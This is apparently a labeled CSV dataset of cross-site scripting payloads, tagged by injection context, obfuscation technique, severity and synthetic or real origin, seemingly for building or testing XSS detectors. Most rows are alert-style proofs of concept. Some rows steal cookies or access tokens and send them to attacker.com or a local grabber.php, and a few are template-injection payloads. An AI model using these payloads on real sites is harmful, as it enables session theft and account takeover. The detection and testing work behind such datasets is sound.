payload,context,technique,severity,length,source
<title	onmozfullscreenchange=prompt('XSS')>,tag_injection,synthetic,medium,43,synthetic
"<!--><AreA oNenDed=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,high,57,synthetic
" onclick=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,47,synthetic
<mtext	onmousedown=console.log(1)>,tag_injection,synthetic,medium,34,synthetic
' ><svg ongotpointercapture=confirm(location.hash)>,attribute_escape,synthetic,medium,51,synthetic
"<del onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</del>",tag_injection,none,medium,82,real
{{constructor.constructor('confirm(document.cookie)')()}},template_injection,synthetic,high,57,synthetic
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,tag_injection,none,medium,71,real
"<figcaption oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,103,real
"<td onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</td>",tag_injection,none,medium,80,real
<s&#101;t onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log('XSS')/>,tag_injection,synthetic,low,84,synthetic
"""%3E%3Cimg src=x onrepeat=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,67,synthetic
"<&#97;r&#101;&#97;
onp&#97;g&#101;show=prompt('XSS')>",tag_injection,synthetic,medium,53,synthetic
"""&amp;gt;&amp;lt;img src=x onerror=prompt(document.domain);&amp;gt;",dom_sink,none,medium,67,real
<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>,tag_injection,none,medium,78,real
"__proto__[%22onfullscreenchange%22]=alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))",dom_sink,synthetic,high,101,synthetic
oncontextmenu=alert(%27XSS%27),event_handler,synthetic,medium,30,synthetic
[#pRomPt DocUmeNt.CooKie /],template_injection,synthetic,high,27,synthetic
"' ><svG oNmoZfuLlsCreEncHanGe=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,66,real
<slot onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</slot><input value=clickme>,tag_injection,none,medium,108,real
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>,dom_sink,none,high,109,real
ontr&#97;nsitionst&#97;rt=confirm/*x*/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,61,synthetic
"<style>:target {color:red;}</style><progress id=x style=""transition:color 1s"" ontransitionend=alert(1)></progress>",tag_injection,none,medium,114,real
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>",tag_injection,none,medium,103,real
%22 ontouchmove=console.log(document.domain) %22,attribute_escape,synthetic,medium,48,synthetic
\' onscrollsnapchange=prompt(location.hash)//,attribute_escape,synthetic,medium,45,synthetic
<animatetransform onpointerdown=prompt(1)/>,tag_injection,synthetic,medium,43,synthetic
<table onmozfullscreenchange=confirm(1)>,tag_injection,synthetic,medium,40,synthetic
<buTtoN sRc=X oNdrAgeNteR=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,47,synthetic
<!--><form ongesturestart=console.log('XSS')>,tag_injection,synthetic,medium,45,synthetic
<tr/ontouchstart=confirm(location.hash)>,tag_injection,synthetic,medium,40,synthetic
"<aside ondblclick=""alert(1)"">AnonKryptiQuz</aside>",tag_injection,none,medium,50,real
__proto__[%22onpointerrawupdate%22]=fetch(document.domain),dom_sink,synthetic,high,58,synthetic
"<;IMG SRC="";jav&;#x0D;ascript:alert(';XSS';);"";>;",generic,none,medium,49,real
"<noframes draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</noframes>",tag_injection,none,medium,89,real
%3Ctr/ontouchstart=confirm(location.hash)%3E,tag_injection,synthetic,medium,44,synthetic
"\"" onplaying=alert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,51,synthetic
"ontr&#97;nsitionst&#97;rt=prompt/*x*/(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,low,77,synthetic
"\"" OneNd=ConFirM('XSS')//",attribute_escape,synthetic,medium,25,synthetic
"setTimeout(""confirm(String.fromCharCode(88,83,83))"",0)",dom_sink,synthetic,high,54,synthetic
`><img src=x oncut=console.log(1)>,attribute_escape,synthetic,medium,34,synthetic
<meter onblur=alert(1) tabindex=1 id=x></meter><input autofocus>,tag_injection,none,medium,64,real
'%3E%3Cimg src=x ontouchstart=prompt(document.domain)%3E,attribute_escape,synthetic,medium,56,synthetic
"ontransitionstart=console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,60,synthetic
'><img src=x ontouchmov&#101;=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,64,synthetic
OnpAgeShoW=cOnfIrm&#40;lOcaTioN.hAsh&#41;,event_handler,synthetic,low,41,synthetic
%22 ><svg onanimationcancel=confirm(location.hash)>,attribute_escape,synthetic,medium,51,synthetic
"""><img src=x oncopy=confirm(location.hash)>",attribute_escape,synthetic,medium,43,synthetic
<nav id=x tabindex=1 onfocusin=alert(1)></nav>,tag_injection,none,medium,46,real
<meta onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,66,real
\' OneNdeD=cOnsOle.loG(1)//,attribute_escape,synthetic,medium,27,synthetic
<datalist onpointerup=alert(1) style=display:block>AnonKryptiQuz</datalist>,tag_injection,none,medium,75,real
"""><img src=x onp&#97;st&#101;=consol&#101;.log(1)>",attribute_escape,synthetic,low,50,synthetic
	onpageshow=prompt(1),event_handler,synthetic,medium,21,synthetic
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/AnonKryptiQuz/)></script",script_injection,unicode_escape|html_entity|url_encoding,low,116,real
""" ><svg onhashchange=console.log(document.domain)>",attribute_escape,synthetic,medium,50,synthetic
"location=""javascr	ipt:prompt('//attacker.com/?c='+document.cookie)""",dom_sink,synthetic,high,67,synthetic
"<custom tags draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",tag_injection,none,medium,100,real
onpoint&#101;rup=prompt/**/(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,53,synthetic
""" oncut=prompt(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,high,47,synthetic
 onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,50,synthetic
<object ontouchstart=console.log(location.hash)/>,tag_injection,synthetic,medium,49,synthetic
"__pRotO__[""oNfoCusIn""]=fEtcH(dOcuMenT.dOmaIn)",dom_sink,synthetic,high,45,synthetic
	onbeforematch=prompt('XSS'),event_handler,synthetic,medium,28,synthetic
"location.href=""javascript:fetch(btoa(document.cookie))""",dom_sink,synthetic,high,55,synthetic
"<plaintext onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</plaintext>",tag_injection,none,medium,77,real
"<iframe onload iframe onload=""javascript:javascript:alert(7934)""></iframe onload>",js_uri,none,medium,81,real
onpointerrawupdate=javascript:alert('XSS'),event_handler,synthetic,medium,42,synthetic
<&#97;udio	onmous&#101;ov&#101;r=consol&#101;.log('XSS')>,tag_injection,synthetic,low,57,synthetic
'%3E%3Cimg src=x ontoggle=prompt(1)%3E,attribute_escape,synthetic,medium,38,synthetic
"<rp draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",tag_injection,none,medium,80,real
"<plaintext draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</plaintext>",tag_injection,none,medium,96,real
"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",js_uri,none,medium,87,real
"""%3E%3Cnoscript onbeforematch=confirm(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,71,synthetic
OnaUxcLicK=cOnfIrm/**/(dOcuMenT.dOmaIn),event_handler,synthetic,low,39,synthetic
<button popovertarget=x>Click me</button><area ontoggle=alert(1) popover id=x>AnonKryptiQuz</area>,tag_injection,none,medium,98,real
"__proto__[%22onanimationiteration%22]=console.log(String.fromCharCode(88,83,83))",dom_sink,synthetic,high,80,synthetic
<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>,tag_injection,none,medium,85,real
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,tag_injection,none,medium,74,real
<IMG SRC=`javascript:javascript:alert(9235)`>,js_uri,case_variation,medium,45,real
document.querySelector(%22body%22).innerHTML+=%22confirm(btoa(document.cookie))%22,dom_sink,synthetic,high,82,synthetic
' ><svG oNanImaTioNitEraTioN=cOnfIrm('XSS')>,attribute_escape,synthetic,medium,44,synthetic
'%3E%3Cimg src=x onmousedown=confirm(1)%3E,attribute_escape,synthetic,medium,42,synthetic
<button popovertarget=x>Click me</button><map ontoggle=alert(1) popover id=x>AnonKryptiQuz</map>,tag_injection,none,medium,96,real
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",tag_injection,none,medium,115,real
`><Img srC=x onEnd=alErt('XSS')>,attribute_escape,synthetic,medium,32,synthetic
'%3E%3Cimg src=x onwheel=prompt(location.hash)%3E,attribute_escape,synthetic,medium,49,synthetic
<select	onanimationstart=prompt(%27XSS%27)>,tag_injection,synthetic,medium,43,synthetic
"""><img src=x ongotpoint&#101;rc&#97;ptur&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape,synthetic,low,90,synthetic
%3Cbase/onbeforecopy=console.log(location.hash)%3E,tag_injection,synthetic,medium,50,synthetic
%3Cselect ongotpointercapture=confirm(document.domain)/%3E,tag_injection,synthetic,medium,58,synthetic
<animatetransform onpointerover=alert(1) style=display:block>AnonKryptiQuz</animatetransform>,tag_injection,none,medium,93,real
"<meter onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</meter>",tag_injection,none,medium,68,real
<span onbeforetoggle=prompt(location.hash) onbeforetoggle=prompt(location.hash)>,tag_injection,synthetic,medium,80,synthetic
&quOt; onPoiNteRdoWn=ConSolE.lOg(DocUmeNt.DomAin) x=&qUot;,attribute_escape,synthetic,medium,58,synthetic
"eval(""fetch(1)"")",dom_sink,synthetic,high,16,synthetic
<button popovertarget=x>Click me</button><meta ontoggle=alert(1) popover id=x>AnonKryptiQuz</meta>,tag_injection,none,medium,98,real
“autofocus onFocUs=’find(l\u{6F}cati\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)’,event_handler,none,low,91,real
 onWheEl=AleRt(1),event_handler,synthetic,medium,17,synthetic
\%27 ondragstart=console.log(location.hash)//,attribute_escape,synthetic,medium,45,synthetic
"<thead onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</thead>",tag_injection,none,medium,72,real
OnwHeeL=aLerT(1),event_handler,synthetic,medium,16,synthetic
"""><img src=x onclick=confirm('XSS')>",attribute_escape,synthetic,medium,36,synthetic
""" ><svg onpoint&#101;rup=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,medium,73,synthetic
"<q onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</q>",tag_injection,none,medium,77,real
"<button onmouseover=""alert(1)"">AnonKryptiQuz</button>",tag_injection,none,medium,53,real
"<thead oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</thead>",tag_injection,none,medium,62,real
"<custom tags draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</custom tags>",tag_injection,none,medium,98,real
onk&#101;ypr&#101;ss=consol&#101;.log&#40;1&#41;,event_handler,synthetic,low,48,synthetic
__proto__[%22onauxclick%22]=confirm(localStorage.getItem(%27token%27)),dom_sink,synthetic,high,70,synthetic
"\"" oncopy=confirm(location.hash)//",attribute_escape,synthetic,medium,34,synthetic
<!--><td onwebkitanimationend=prompt('XSS')>,tag_injection,synthetic,medium,44,synthetic
""" ><svg onpaste=console.log(1)>",attribute_escape,synthetic,medium,31,synthetic
<figcaption onpointerout=alert(1) style=display:block>AnonKryptiQuz</figcaption>,tag_injection,none,medium,80,real
onfocusout=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,32,synthetic
&quot; onpagereveal=confirm(document.domain) x=&quot;,attribute_escape,synthetic,medium,53,synthetic
"""%3E%3Cimg src=x onend=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,64,synthetic
""" onb&#101;for&#101;p&#97;st&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape,synthetic,medium,83,synthetic
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onwebkitanimationend=""alert(1)""></legend>",tag_injection,none,medium,103,real
/%2527)%253B%2520alert(document.cookies)%253B%252F%252F,dom_sink,url_encoding,high,55,real
<listing x=y onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS')>,tag_injection,synthetic,low,76,synthetic
"&quot; onend=confirm(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,60,synthetic
"\%27 onpointerrawupdate=confirm(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,64,synthetic
"onsubmit=confirm/***/(String.fromCharCode(88,83,83))",event_handler,synthetic,high,52,synthetic
"element.setAttribute(""onclick"",""prompt(location.hash)"")",dom_sink,synthetic,medium,55,synthetic
%3Cxss x=y onkeypress=console.log(1)%3E,tag_injection,synthetic,medium,39,synthetic
"`><img src=x ontransitionstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,70,synthetic
%22 onbeforepaste=alert(%27XSS%27) %22,attribute_escape,synthetic,medium,38,synthetic
<input4 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</input4>,tag_injection,none,medium,78,real
<button popovertarget=x>Click me</button><content ontoggle=alert(1) popover id=x>AnonKryptiQuz</content>,tag_injection,none,medium,104,real
"data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg",js_uri,none,low,78,real
"onpromptdismiss=javascr	ipt:console.log(String.fromCharCode(88,83,83))",event_handler,synthetic,high,70,synthetic
""" ><svg ontransitionend=confirm('XSS')>",attribute_escape,synthetic,medium,39,synthetic
"&lt;IMG SRC='vbscript&#058;msgbox(\""XSS\"")'&gt;",generic,html_entity,low,47,real
' onfocus=console.log(1) ',attribute_escape,synthetic,medium,26,synthetic
""" oNenDed=alErt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
' ondrop=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,44,synthetic
\' ondragover=prompt(1)//,attribute_escape,synthetic,medium,25,synthetic
%3Ctd x=y onend=console.log(document.domain)%3E,tag_injection,synthetic,medium,47,synthetic
"onb&#101;for&#101;toggl&#101;=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler,synthetic,medium,95,synthetic
"\"" onb&#101;for&#101;p&#97;st&#101;=&#97;l&#101;rt(1)//",attribute_escape,synthetic,low,55,synthetic
&#106;&#97;v&#97;script:consol&#101;.log(1),js_uri,synthetic,low,43,synthetic
"<rtc onmouseup=""alert(1)"">AnonKryptiQuz</rtc>",tag_injection,none,medium,45,real
<xsS/oNtoGglE=cOnsOle.loG('XSS')>,tag_injection,synthetic,medium,33,synthetic
<!--><ScrIpt onPoiNteRraWupDatE=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,61,synthetic
"<output oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</output>",tag_injection,none,medium,64,real
"setInterval(""alert(navigator.sendBeacon('//attacker.com',document.cookie))"",100)",dom_sink,synthetic,high,80,synthetic
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",script_injection,unicode_escape|html_entity|url_encoding,low,119,real
document.body.innerHTML=%22<img src=x onerror=prompt(%27//attacker.com/?c=%27+document.cookie)>%22,dom_sink,synthetic,high,98,synthetic
"<datalist onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</datalist>",tag_injection,none,medium,92,real
"<tt draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</tt>",tag_injection,none,medium,57,real
&#106;avascript:confirm(1),js_uri,synthetic,medium,26,synthetic
"onpointerover=alert(String.fromCharCode(88,83,83))",event_handler,synthetic,high,50,synthetic
"__proto__[""onmousedown""]=eval(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,85,synthetic
&quot; onfocus=prompt(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape,synthetic,medium,53,synthetic
jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//,dom_sink,html_entity|encoding|comment_injection|url_encoding,high,334,real
<--`<img/src=` onerror=confirm``> --!>,tag_injection,none,low,38,real
<scRipT>/*/cOnsOle.loG(dOcuMenT.dOmaIn)</sCriPt>,script_injection,synthetic,medium,48,synthetic
"<keygen onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",tag_injection,none,medium,73,real
%3Ctitle x=y onclick=confirm('XSS')%3E,tag_injection,synthetic,medium,38,synthetic
"<xmp draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</xmp>",tag_injection,none,medium,64,real
<template src=x onended=prompt('XSS')>,tag_injection,synthetic,medium,38,synthetic
<audio2 onpointerout=alert(1) style=display:block>AnonKryptiQuz</audio2>,tag_injection,none,medium,72,real
'-alert(0)-',attribute_escape,none,medium,12,real
"EvaL(""XMLHttPReQueSt(DocUmeNt.DomAin)"")",dom_sink,synthetic,high,39,synthetic
 onwaiting=console.log(location.hash),event_handler,synthetic,medium,37,synthetic
ontransitionrun=javascr	ipt:alert(1),event_handler,synthetic,medium,36,synthetic
%22 ><svg ontransitionend=alert(document.domain)>,attribute_escape,synthetic,medium,49,synthetic
	onmouseover=console.log(1),event_handler,synthetic,medium,27,synthetic
#{{AleRt(DocUmeNt.DomAin)}},template_injection,synthetic,medium,27,synthetic
""" oNdrAgsTarT=cOnfIrm(1) """,attribute_escape,synthetic,medium,26,synthetic
%27 ><svg ondragstart=console.log(location.hash)>,attribute_escape,synthetic,medium,49,synthetic
%3Ctable onselect=prompt(1) onselect=prompt(1)%3E,tag_injection,synthetic,medium,49,synthetic
<liStiNg OnwEbkItaNimAtiOneNd=ConSolE.lOg('XSS') onWebKitAniMatIonEnd=coNsoLe.Log('XSS')>,tag_injection,synthetic,medium,89,synthetic
<article id=x tabindex=1 onfocus=alert(1)></article>,tag_injection,none,medium,52,real
"onhashchange=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,51,synthetic
""" ><svg onbeforepaste=alert('XSS')>",attribute_escape,synthetic,medium,35,synthetic
eval(%22console.log(btoa(document.cookie))%22),dom_sink,synthetic,high,46,synthetic
"<track onmouseover=""alert(1)"">AnonKryptiQuz</track>",tag_injection,none,medium,51,real
%22><listing ontransitionstart=confirm(document.domain)>,tag_injection,synthetic,medium,56,synthetic
{{constructor.constructor(%27confirm(document.cookie)%27)()}},template_injection,synthetic,high,61,synthetic
{{ lipsum.__glob&#97;ls__['os'].pop&#101;n('prompt').r&#101;&#97;d() }},template_injection,synthetic,low,71,synthetic
""" ><svG oNcaNplAy=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape,synthetic,medium,45,synthetic
"<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",tag_injection,none,medium,97,real
"""><vid&#101;o onclick=consol&#101;.log('XSS')>",tag_injection,synthetic,low,46,synthetic
<!--><area onclose=prompt(1)>,tag_injection,synthetic,medium,29,synthetic
